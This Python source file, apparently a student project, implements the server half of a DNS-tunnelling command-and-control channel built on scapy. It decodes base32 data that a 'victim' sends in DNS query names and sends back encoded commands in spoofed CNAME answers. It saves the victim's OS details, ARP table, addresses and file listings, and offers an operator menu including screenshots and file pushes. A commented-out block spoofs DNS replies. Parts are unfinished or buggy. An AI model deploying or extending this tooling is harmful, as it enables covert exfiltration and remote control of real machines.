"""
Shachar Markovich 211491766
Naor Maman        207341777
"""
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import base64


class DNSTunnelingAuthoritativeDNS:
    TYPES = {'A': 1, 'AAAA': 28, 'CNAME': 5, 'TXT': 16}
    DOMAIN = b".resh.gimel."
    MAX_CHARS_IN_SUBDOMAIN = 63
    FORWARD_IP = '8.8.8.8'
    MAX_DOMAIN = 255 - len(DOMAIN)
    CLIENT_COMMANDS = {'hello': 100, 'ok&ans': 201, 'ok&retransmission': 202, 'ok&more': 208, 'next&more': 209,
                       'last': 210}
    SERVER_COMMANDS = {'ok&process': 200, 'error&retransmission': 400, 'ok&continue': 222, 'ok&sleep': 299}

    @staticmethod
    def listen_socket():
        """
        this machine is the DNS nameserver,
        therefore, it's NOT listen in Known-DNS-port 53,
        so we open a socket in this port, in order to avoid the machine to send a ICMP port-unreachable

        :returns: UDP server listen socket
        """
        dns_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_udp_socket.bind(('', 53))
        return dns_udp_socket

    def attack(self, request):
        if request[DNS].qd.qtype not in DNSTunnelingAuthoritativeDNS.TYPES.values():
            err_ans = self.build_response(self.CLIENT_COMMANDS['error&retransmission'], 'Unknown RR type')
            self.send_response(request, err_ans)

        else:
            identify, cmd_code, data = self.parse_request(request[DNSQR])
            pass  # TODO: save the data, send the next command to operate

    # region send & receive functions:
    @staticmethod
    def build_response(cmd_code: int, cmd: str):
        """
        Build the next command for the victim.

        :param cmd_code: the command code.
        :param cmd: the next command.
        :return: an encoded answer in base 32
        """
        return base64.b32encode(str(cmd_code).encode()) + b'.' + base64.b32encode(cmd.encode()) \
               + DNSTunnelingAuthoritativeDNS.DOMAIN

    @staticmethod
    def send_response(request, fake_domain: bytes):
        """
        Send a DNS response with RR type=CNAME.
        The data in the response is `fake_domain`.

        :param request: the sniffed DNS request
        :param fake_domain: the data to send to victim
        """
        response = IP(dst=request[IP].src) / UDP(sport=53, dport=request[UDP].sport)
        response /= DNS(id=request[DNS].id, ancount=1, qr=1, rd=1, qd=request[DNSQR],
                        an=DNSRR(rrname=request[DNSQR].qname, rdata=fake_domain,
                                 type=DNSTunnelingAuthoritativeDNS.TYPES['CNAME']))
        send(response, verbose=False)

    @staticmethod
    def parse_request(request):
        """
        Parse from a given DNS `fake` request the identify of the victim, the data and it's code.

        :param request: a DNS request header.
        :return: the identify of the victim, data's code and the data itself
        """
        # qname format:
        # identify.base32(code).base32(data).resh.gimel
        qname = request[DNSQR].qname

        # decode the answer parts:
        identify, ans_code, enc_data = qname.split(b'.', 2)
        identify = identify.decode()
        cmd_code = base64.b32decode(ans_code).decode()
        data = base64.b32decode(enc_data[:-len(DNSTunnelingAuthoritativeDNS.DOMAIN)].replace(b'.', b'')).decode()
        try:
            return identify, int(cmd_code), data
        except ValueError:
            return identify, DNSTunnelingAuthoritativeDNS.SERVER_COMMANDS['error&retransmission'], "error in code type"

    # endregion

    @staticmethod
    def prepare_data_for_writing(os_data: str = '', arp_table: str = '', internet_data: str = '', files: str = ''):
        """
        Prepare data for writing in file.

        :param os_data: information about victim OS.
        :param arp_table: information about victim ARP table.
        :param internet_data: information about victim internet addresses.
        :param files: information about victim files in a directory.
        :return: dict of parse data ready to be writing in txt file.
        """
        write_it = {}
        if os_data:
            write_it['OS information:'] = os_data
        if arp_table:
            write_it['ARP table'] = os_data
        if internet_data:
            write_it['Pv4, IPv6 and MAC addresses:'] = os_data
        if files:
            write_it['files in director:'] = os_data

        return write_it

    @staticmethod
    def write_data(identify: str, victim_data: dict):
        """
        Save in file the data that we got from a victim.

        :param identify: the victim identify number
        :param victim_data: the data itself
        """
        with open(f'{identify}.txt', 'w') as f:
            for data_type, data in victim_data.items():
                f.write(data_type + '\n')
                f.write(data + '\n')
                f.write('=============\n\n\n')

    @staticmethod
    def menu():
        print("""
        A victim had been connect!
        Choose what you want:
        1) Data about the victim OS type.
        2) See his files and directories.
        3) Get IPv4, IPv6 and Mac addresses.
        4) Get his ARP table.
        5) Send him to sleep.
        6) Send him a file.
        7) Get a screenshot.
        99) Exit
        """)
        choice = 8
        while not (1 < choice < 7 or choice == 99):
            try:
                choice = int(input('Your choice: '))
            except ValueError:
                pass
        return choice

    def prn(self, pkt):
        """
        process MiTM only for `self.url`, for others DNS request - forwarding the request to a real DNS server
        :param pkt: the DNS request packet from the victim DNS nameserver
        """
        qname = pkt[DNSQR].qname.decode()

        if DNSTunnelingAuthoritativeDNS.DOMAIN in qname:
            print(f"[!] a DNS request to `{qname}` has been detected")
            self.attack(pkt)

        else:
            print(f"[!] a DNS request to `{qname}` has been detected")
            # forwarding request to google public dns server
            forward_res = IP(dst=DNSTunnelingAuthoritativeDNS.FORWARD_IP) / UDP(sport=12345) / DNS(id=pkt[DNS].id, rd=1,
                                                                                                   qd=pkt[DNSQR])
            response = sr1(forward_res, verbose=False)

            pkt_response = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport) / response[DNS]
            send(pkt_response, verbose=False)

    @staticmethod
    def dns_request_filter(pkt) -> bool:
        """
        Filter only DNS request.

        :param pkt: the sniffed packet.
        :returns: if it mean the condition above.
        """
        return DNS in pkt and DNSRR not in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0

    def run(self):
        """
        run the DNS Spoof attack
        """
        listen_socket = DNSTunnelingAuthoritativeDNS.listen_socket()

        try:
            sniff(lfilter=self.dns_request_filter, prn=self.prn)
        except KeyboardInterrupt:
            print("[!] A keyboard interrupt has been detected.")
            print("[!] Finish attack.")
            listen_socket.close()


def main():
    dns_spoof_attack = DNSTunnelingAuthoritativeDNS()
    dns_spoof_attack.run()


'''
def doIt(pkt):
    qtype = pkt[DNS].qd.qtype
    res = IP(dst=pkt[IP].src) / UDP(sport=53, dport=pkt[UDP].sport) / DNS(id=pkt[DNS].id, ancount=2, qr=1, rd=1,
                                                                          qd=pkt[DNSQR])

    if qtype == 1:  # A
        print("recv pkt with qtype=A")
        res[DNS].an = DNSRR(rrname=pkt[DNSQR].qname, rdata='1.2.2.3', type='A') / DNSRR(rrname=pkt[DNSQR].qname,
                                                                                        rdata='5.6.7.8', type='A')
        send(res, verbose=False)

    elif qtype == 28:  # AAAA
        print("recv pkt with qtype=AAAA")
        res[DNS].an = DNSRR(rrname=pkt[DNSQR].qname, rdata='2001:4860:4802:32::78', type='AAAA') / DNSRR(
            rrname=pkt[DNSQR].qname, rdata='2001:4860:4802:23::79', type='AAAA')
        send(res, verbose=False)

    elif qtype == 5:  # CNAME
        print("recv pkt with qtype=CNAME")
        res[DNS].an = DNSRR(rrname=pkt[DNSQR].qname, rdata='got-you.fake.url.org.', type='CNAME')
        res[DNS].ancount = 1
        res[DNS].show()
        send(res, verbose=False)

    elif qtype == 16:  # TXT
        print("recv pkt with qtype=TXT")
        res[DNS].an = DNSRR(rrname=pkt[DNSQR].qname, rdata=b'I can write here what ever I want', type='TXT') / DNSRR(
            rrname=pkt[DNSQR].qname, rdata=b'Here I can also write what ever I want', type='TXT')
        send(res, verbose=False)


def dns_reqs_send_res():
    sniff(lfilter=lambda pkt: DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0, prn=doIt)


def main2():
    dns_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_udp_socket.bind(('', 53))
    print("UDP port 53 is running")
    # dns_spoof_attack = AuthoritativeDNS()
    # dns_spoof_attack.run()
    dns_reqs_send_res()
    dns_udp_socket.close()
'''

if __name__ == "__main__":
    main()
